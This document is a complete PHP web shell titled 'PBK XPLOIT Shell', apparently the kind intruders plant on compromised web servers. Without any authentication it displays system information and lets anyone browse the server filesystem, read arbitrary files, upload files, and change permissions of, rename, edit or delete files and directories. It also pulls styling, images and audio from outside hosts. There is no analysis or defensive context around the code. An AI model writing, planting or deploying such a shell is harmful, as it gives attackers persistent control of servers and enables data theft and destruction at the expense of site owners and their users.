<?php
 set_time_limit(0);error_reporting(0);if(get_magic_quotes_gpc()){foreach($_POST as $key=>$value){$_POST[$key]=stripslashes($value);}}?>
<!DOCTYPE html>
<html lang="en-US">

		 <head>
			 <meta charset="utf-8">
			 <meta name="viewport" content="width=device-width">
			 
				<title>PBK XPLOIT Shell</title>
				<link rel="icon" href="\https://i.top4top.io/p_23768q16o1.png" />
				<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Berkshire+Swash" type="text/css">
				<link rel="stylesheet" href="//0x5a455553.github.io/MARIJUANA/MKY.css" type="text/css">
				
		 </head>
		 
		 <body>
		  <script src="https://cdn.rawgit.com/bungfrangki/efeksalju/2a7805c7/efek-salju.js" type="text/javascript"></script>
				<center>
				<img width="300" height="300" src="https://i.top4top.io/p_23768q16o1.png"><br><br><audio src="https://b.top4top.io/m_1832kvrfv2.m4a" type="audio/mpeg" controls="controls" autoplays="autoplays"></a>
				</center>
			 <center><h1><font face="courier new" color="red">PBK XPLOIT</font></h1></center>
			 <br>
			 <table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
				<tr>
					<td>
						<?php echo php_uname();?>
						
						<br>
<?php
 if(isset($_GET['path'])){$path=$_GET['path'];}else {$path=getcwd();}$path=str_replace('\\','/',$path);$paths=explode('/',$path);foreach($paths as $id=>$pat){if($pat==''&&$id==0){$a=true;echo '
						<a class="wrn" href="?path=/">/</a>';continue;}if($pat=='')continue;echo '							
						<a class="wrn" href="?path=';for($i=0;$i<=$id;$i++){echo "$paths[$i]";if($i!=$id)echo "/";}echo '">'.$pat.'</a>/';}echo '
					</td>
				</tr>

				<tr>
					<td>';if(isset($_FILES['file'])){if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){echo '
						<script>alert("OK");</script>
						
						<br>
						';}else{echo '
						<script>alert("FAIL");</script>
						
						<br>
						';}}?>

						<form enctype="multipart/form-data" method="POST">
							<input type="file" name="file" />
							<input type="submit" value=">>" />
						</form>
					</td>
				</tr>
<?php
 if(isset($_GET['filesrc'])){echo "				<tr>
					<td>
					
					<br>
					
					<center>
					";echo "<font color=\"#00FF66 \">".$_GET['filesrc']."</font>";echo '
					</center>
					</td>
				</tr>
			</table>
			
			<br>';echo('
			
			<pre>
'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'			
			</pre>');}elseif(isset($_GET['option'])&&$_POST['opt']!='delete'){echo '				</table>
		 
				<br>
		 
				<center>'.$_POST['path'].'
				
				<br>
				<br>';if($_POST['opt']=='chmod'){if(isset($_POST['perm'])){if(chmod($_POST['path'],$_POST['perm'])){echo '
					
				<script>alert("OK");</script>
				
				<br>';}else{echo '
					
				<script>alert("FAIL");</script>
				
				<br>';}}?>


				<form method="POST">
					Permission : 
					<input name="perm" type="text" size="4" value="<?php echo substr(sprintf('%o',fileperms($_POST['path'])),-4);?>" />
					<input type="hidden" name="path" value="<?php echo $_POST['path'];?>">
					<input type="hidden" name="opt" value="chmod">
					<input type="submit" value=">>" />
				</form>
<?php
 }elseif($_POST['opt']=='rename'){if(isset($_POST['newname'])){if(rename($_POST['path'],$path.'/'.$_POST['newname'])){echo '
					
				<script>alert("OK");</script>
				
				<br>';}else{echo '
					
				<script>alert("FAIL");</script>
				
				<br>';}$_POST['name']=$_POST['newname'];}?>


				<form method="POST">
					New Name : 
					<input name="newname" type="text" size="20" value="<?php echo $_POST['name'];?>" />
					<input type="hidden" name="path" value="<?php echo $_POST['path'];?>">
					<input type="hidden" name="opt" value="rename">
					<input type="submit" value=">>" />
				</form>
<?php
 }elseif($_POST['opt']=='edit'){if(isset($_POST['src'])){$fp=fopen($_POST['path'],'w');if(fwrite($fp,$_POST['src'])){echo '
					
				<script>alert("OK");</script>
				
				<br>';}else{echo '
					
				<script>alert("FAIL");</script>
				
				<br>';}fclose($fp);}?>


				<form method="POST">
				
					<textarea cols=80 rows=20 name="src">
<?php echo htmlspecialchars(file_get_contents($_POST['path']));?>
</textarea>
					
					<br>
					
					<input type="hidden" name="path" value="<?php echo $_POST['path'];?>">
					<input type="hidden" name="opt" value="edit">
					<input type="submit" value=">>" />
				</form>
<?php
 }echo '				</center>';}else{echo '			 </table>
		 
			 <br>
		 
			 <center>';if(isset($_GET['option'])&&$_POST['opt']=='delete'){if($_POST['type']=='dir'){if(rmdir($_POST['path'])){echo '
					
				<script>alert("OK");</script>
				
				<br>';}else{echo '
					
				<script>alert("FAIL");</script>
				
				<br>';}}elseif($_POST['type']=='file'){if(unlink($_POST['path'])){echo '
					
				<script>alert("OK");</script>
				
				<br>';}else{echo '
					
				<script>alert("FAIL");</script>
				
				<br>';}}}echo '</center>';$scandir=scandir($path);?>


			 <div id="content">
				<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
					<tr class="first">
						<td>
							<center>Name</center>
						</td>
						<td>
							<center>Size</center>
						</td>
						<td>
							<center>Permissions</center>
						</td>
						<td>
							<center>Options</center>
						</td>
					</tr>
					
<?php
 foreach($scandir as $dir){if(!is_dir("$path/$dir")||$dir=='.'||$dir=='..')continue;echo "					
					<tr>
						<td>
							<a class=\"wrn\" href=\"?path=$path/$dir\">$dir</a>
						</td>								
						<td>
							<center>--</center>
						</td>						
						<td>
							<center>";if(is_writable("$path/$dir"))echo '<font color="#00BB00">';elseif(!is_readable("$path/$dir"))echo '<font color="red">';echo perms("$path/$dir");if(is_writable("$path/$dir")||!is_readable("$path/$dir"))echo '</font>';echo "</center>
						</td>
						<td>
							<center>
								<form method=\"POST\" action=\"?option&path=$path\">
								
									<select name=\"opt\">
										<option value=\"\"></option>
										<option value=\"delete\">Delete</option>
										<option value=\"chmod\">Chmod</option>
										<option value=\"rename\">Rename</option>
									</select>
									
									<input type=\"hidden\" name=\"type\" value=\"dir\">
									<input type=\"hidden\" name=\"name\" value=\"$dir\">
									<input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
									<input type=\"submit\" value=\">>\" />
								</form>
							</center>
						</td>
					</tr>";}?>

					<tr class="first">
						<td></td>
						<td></td>
						<td></td>
						<td></td>
					</tr>
<?php
 foreach($scandir as $file){if(!is_file("$path/$file"))continue;$size=filesize("$path/$file")/1024;$size=round($size,3);if($size>=1024){$size=round($size/1024,2).' MB';}else{$size=$size.' KB';}echo "					<tr>
						<td>
							<a class=\"wrn\" href=\"?filesrc=$path/$file&path=$path\">$file</a>
						</td>
						
						<td>
							<center>".$size."</center>
						</td>
						<td>
							<center>";if(is_writable("$path/$file"))echo '
								<font color="#00BB00">';elseif(!is_readable("$path/$file"))echo '
								<font color="red">';echo perms("$path/$file");if(is_writable("$path/$file")||!is_readable("$path/$file"))echo '</font>';echo "
							</center>
						</td>
						<td>
							<center>
								<form method=\"POST\" action=\"?option&path=$path\">
								
									<select name=\"opt\">
										<option value=\"\"></option>
										<option value=\"delete\">Delete</option>
										<option value=\"chmod\">Chmod</option>
										<option value=\"rename\">Rename</option>
										<option value=\"edit\">Edit</option>
									</select>
									
									<input type=\"hidden\" name=\"type\" value=\"file\">
									<input type=\"hidden\" name=\"name\" value=\"$file\">
									<input type=\"hidden\" name=\"path\" value=\"$path/$file\">
									<input type=\"submit\" value=\">>\" />
								</form>
							</center>
						</td>
					</tr>";}echo '
				</table>
			</div>';}?>



		</body>
</html>
<?php
 function perms($file){$perms=fileperms($file);if(($perms&0xC000)==0xC000){$info='s';}elseif(($perms&0xA000)==0xA000){$info='l';}elseif(($perms&0x8000)==0x8000){$info='-';}elseif(($perms&0x6000)==0x6000){$info='b';}elseif(($perms&0x4000)==0x4000){$info='d';}elseif(($perms&0x2000)==0x2000){$info='c';}elseif(($perms&0x1000)==0x1000){$info='p';}else {$info='u';}$info.=(($perms&0x0100)?'r':'-');$info.=(($perms&0x0080)?'w':'-');$info.=(($perms&0x0040)?(($perms&0x0800)?'s':'x'):(($perms&0x0800)?'S':'-'));$info.=(($perms&0x0020)?'r':'-');$info.=(($perms&0x0010)?'w':'-');$info.=(($perms&0x0008)?(($perms&0x0400)?'s':'x'):(($perms&0x0400)?'S':'-'));$info.=(($perms&0x0004)?'r':'-');$info.=(($perms&0x0002)?'w':'-');$info.=(($perms&0x0001)?(($perms&0x0200)?'t':'x'):(($perms&0x0200)?'T':'-'));return $info;}?>
